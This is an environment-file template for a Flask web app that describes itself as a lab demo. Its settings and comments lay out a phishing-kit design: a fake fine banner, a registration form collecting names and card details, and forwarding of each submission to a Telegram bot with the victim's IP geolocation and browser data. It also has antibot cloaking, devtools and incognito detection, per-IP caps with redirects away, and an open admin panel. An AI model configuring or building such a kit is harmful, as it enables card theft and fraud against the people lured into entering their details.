# Template only: copy to `.env` and fill in your values.
# Safe to commit — no real URLs, keys, or host-specific settings.
# The app loads `.env` from the same folder as `app.py` (not from the shell cwd).

# --- Core ---
FLASK_SECRET_KEY=change-this-to-a-long-random-string
PORT=5000

# --- Gate handoff (change for anything beyond local demo) ---
HANDOFF_SECRET=demo-handoff-pepper-change-me

# --- Optional HMAC on POST /p (leave empty to disable signing requirement) ---
GATE_HMAC_SECRET=

# --- Session / browser ---
SESSION_SAMESITE=Strict
COOKIE_SECURE=
STRICT_ORIGIN=

# --- Gate challenges (instructor toggles; leave empty for defaults) ---
POW_LEADING_ZEROS_HEX=4
GATE_CSRF_DISABLED=
HANDSHAKE_DISABLED=
API_CSRF_DISABLED=
# 1: fewer lines in the Flask dev server terminal (Werkzeug access + [DEMO REGISTER])
QUIET_TERMINAL=

# Bango fine-banner (amount / report # / date): stable on refresh (not per reload).
# session = first view in session stores values; F5 keeps them until the session ends.
# ip = same values for the same client IP (HMAC of IP + FLASK_SECRET_KEY), no session store.
BANGO_FINE_STABILITY=session

# --- Lists & risk ---
RISK_BLOCK_THRESHOLD=100
# true = hard deny if the browser sends a private-mode hint (JS: storage.estimate + webkit + IDB; not 100% reliable; spoofable).
INCOGNITO_BLOCK=

# --- Remote antibot policy: one switch + endpoint credentials ---
# REMOTE_ANTIBOT=off (default if unset) = never call. on|true|1|yes = call when URL+key set.
# Flask re-reads these keys from .env on each POST /p (no restart needed after edits).
REMOTE_ANTIBOT=off
REMOTE_ANTIBOT_URL=
REMOTE_ANTIBOT_API_KEY=
REMOTE_ANTIBOT_TIMEOUT_SEC=5
REMOTE_ANTIBOT_FAIL_OPEN=true
# Legacy fallback names still supported: EXTERNAL_GUARD*

# --- Rate & lifetime quota ---
RATE_WINDOW_SEC=60
RATE_MAX=600
# Max consumed slots per IP: each gate pass + each external_guard_* deny in SQLite.
GATE_LIFETIME_MAX_ALLOWS_PER_IP=10

# --- When lifetime IP cap hits gate (use https in real deploy) ---
GATE_BLOCKED_REDIRECT_URL=https://example.com
# Client shell guard: 1=on 0=off (right-click, devtools heuristics, optional redirect URL).
# Read from this file on each request (no Flask restart needed). Legacy: SHELL_GUARD.
GUARD_DEVTOOLS=1
# SHELL_GUARD=1

# --- lab_shield (optional: XOR class map in context, DOM noise filter, jitter, IP block) ---
# Max random per-request sleep (ms), 0=off. Hardens trivial timing only in local training.
RESPONSE_JITTER_MS_MAX=0
# Comma/space-separated client IPs to reject (e.g. 198.51.100.1). 127.0.0.1 = block localhost.
IP_BLOCKLIST=
# 1: after a successful /p, block /api/* if User-Agent diverges from the one at /p.
UA_MISMATCH_BLOCK=0
# 1: random 400/403/429 for UA mismatch (only if MISMATCH_BLOCK=1; can break strict clients).
UA_MISMATCH_VARIABLE_STATUS=0
# 1: shuffle JSON key order in some lab error bodies (fingerprinting resistance exercise).
LAB_SHUFFLE_ERROR_JSON=0

# --- Billing full-page glass (seconds) — primary keys; legacy BANGO_*/SPA_* still read for migration ---
# After successful register, main glass (1–120; default 20 if unset, or legacy fallback).
BILLING_REG_LOADING_SECONDS=
# Optional 0–120: extra full-screen wait after the main register glass, before the green success. Empty = 0.
BILLING_POST_REG_GLASS_SECONDS=
# After success: show checkmark then, if set, redirect (http/https only).
BILLING_DONE_REDIRECT_URL=
# Seconds to show the check before redirect (1–30; default 3).
BILLING_DONE_REDIRECT_DELAY_SEC=
# Legacy fallbacks still supported in code:
# BANGO_REG_LOADING_SECONDS, BANGO_POST_REG_GLASS_SECONDS,
# BANGO_DONE_REDIRECT_URL, BANGO_DONE_REDIRECT_DELAY_SEC,
# SPA_REG_LOADING_SECONDS, SPA_MFA_SUCCESS_LOADING_SECONDS,
# SPA_DONE_REDIRECT_URL, SPA_DONE_REDIRECT_DELAY_SEC

# Browser→server: Bango PII in POST is wrapped with public.pem; server decrypts with (default) keys below.
# Optional override for the *private* PEM if not keys_only/private_demo.pem:
# BANGO_PII_DECRYPT_PEM=
# 1 = show names/cards as plaintext in Telegram (unsafe). Default: encrypted PII block only (public.pem).
TELEGRAM_PII_PLAINTEXT=
# Optional: Telegram (Bot API sendMessage) once per successful register — same bot token/chat.
# Messages add IP geo (ipapi.co over HTTPS) + OS/browser from User-Agent. Local/private IPs skip geo.
# Glass timing is client-side; register API does not wait for Telegram.
# Create a bot with @BotFather, then chat_id = your user id (e.g. from @userinfobot) or group id.
# Restart Flask after editing .env. If nothing arrives: start the bot chat (/start); check
# Flask logs for lines starting with "telegram".
TELEGRAM_BOT_TOKEN=
TELEGRAM_CHAT_ID=
# Optional forum topic id (positive integer) for supergroups with topics.
TELEGRAM_THREAD_ID=

START_DEBUG_SECRET=1234

# --- Admin panel (single password) ---
# Access mode: open | restricted
ADMIN_PANEL_PASSWORD=
ADMIN_PANEL_ACCESS_MODE=open
# Used only when ADMIN_PANEL_ACCESS_MODE=restricted (comma/space separated IPs)
ADMIN_PANEL_IP_WHITELIST=
# Theme affects only the data-entry UI template.
ACTIVE_THEME=default
